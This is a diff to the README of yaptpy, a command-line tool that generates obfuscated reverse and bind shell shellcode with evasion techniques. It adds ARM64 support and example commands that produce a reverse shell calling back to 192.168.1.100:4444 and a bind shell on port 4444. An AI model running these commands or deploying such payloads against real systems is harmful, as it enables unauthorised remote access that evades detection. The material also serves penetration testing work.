@@ -1,11 +1,15 @@
 # yaptpy
 
-> CLI tool that generates highly obfuscated x86_64 reverse shell shellcode with multiple evasion techniques
+> CLI tool that generates highly obfuscated x86_64/ARM64 reverse shell shellcode with multiple evasion techniques
 
 [![PyPI](https://img.shields.io/pypi/v/yaptpy.svg)](https://pypi.org/project/yaptpy/)
 [![Python](https://img.shields.io/pypi/pyversions/yaptpy.svg)](https://pypi.org/project/yaptpy/)
 [![Coverage](https://codecov.io/gh/daedalus/yaptpy/branch/main/graph/badge.svg)](https://codecov.io/gh/daedalus/yaptpy)
 [![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
+
+## Architecture Support
+- x86_64 (amd64) - Default
+- ARM64 (aarch64) - With reverse shell and bind shell support
 
 ## Install
 
@@ -41,6 +45,15 @@ yaptpy --help
 Basic reverse shell:
 ```bash
 yaptpy --ip 192.168.1.100 --port 4444
+```
+
+### ARM64 (aarch64)
+```bash
+# ARM64 reverse shell
+yaptpy --arch arm64 --ip 192.168.1.100 --port 4444
+
+# ARM64 bind shell
+yaptpy --arch arm64 --bind --port 4444
 ```
 
 Obfuscated version with multiple techniques:
